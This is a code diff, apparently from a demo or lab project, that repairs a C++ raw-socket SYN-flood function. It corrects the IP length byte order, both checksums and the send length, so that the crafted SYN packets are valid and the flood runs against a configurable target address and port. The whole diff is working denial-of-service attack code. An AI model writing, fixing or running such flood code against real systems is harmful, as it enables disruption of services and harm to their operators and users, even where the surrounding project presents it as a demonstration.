@@ -65,7 +65,7 @@ util::Result<void> run_syn_flood(const DemoConfig& cfg) {
 
     char datagram[4096];
     struct iphdr *iph = (struct iphdr *) datagram;
-    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
+    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
     struct pseudo_header psh;
 
     auto start = std::chrono::steady_clock::now();
@@ -85,19 +85,20 @@ util::Result<void> run_syn_flood(const DemoConfig& cfg) {
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
-        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+        // Fix: Use htons() for tot_len (R6.3/R5.15)
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
         iph->id = htons(54321);
         iph->frag_off = 0;
         iph->ttl = 255;
         iph->protocol = IPPROTO_TCP;
         iph->check = 0;
-        // Use loopback source for loopback target to ensure delivery (R5.14-R5.16)
         iph->saddr = inet_addr("127.0.0.1"); 
         iph->daddr = dest.sin_addr.s_addr;
-        iph->check = csum((unsigned short *) datagram, iph->tot_len);
+        // Fix: IP checksum only over IP header (20 bytes)
+        iph->check = csum((unsigned short *) datagram, sizeof(struct iphdr));
 
         // TCP Header
-        tcph->source = htons(static_cast<uint16_t>(sport_base++));
+        tcph->source = htons(sport_base++);
         if (sport_base == 0) sport_base = 1024;
         tcph->dest = htons(cfg.target_port);
         tcph->seq = 0;
@@ -114,8 +115,8 @@ util::Result<void> run_syn_flood(const DemoConfig& cfg) {
         tcph->urg_ptr = 0;
 
         // Pseudo header for checksum
-        psh.source_address = inet_addr("127.0.0.1");
-        psh.dest_address = dest.sin_addr.s_addr;
+        psh.source_address = iph->saddr;
+        psh.dest_address = iph->daddr;
         psh.placeholder = 0;
         psh.protocol = IPPROTO_TCP;
         psh.tcp_length = htons(sizeof(struct tcphdr));
@@ -127,8 +128,7 @@ util::Result<void> run_syn_flood(const DemoConfig& cfg) {
 
         tcph->check = csum((unsigned short*) pseudogram, psize);
 
-        if (sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *) &dest, sizeof(dest)) < 0) {
-            // Log once then exit if failure
+        if (sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &dest, sizeof(dest)) < 0) {
             return util::Result<void>::Err("sendto failed");
         }
 
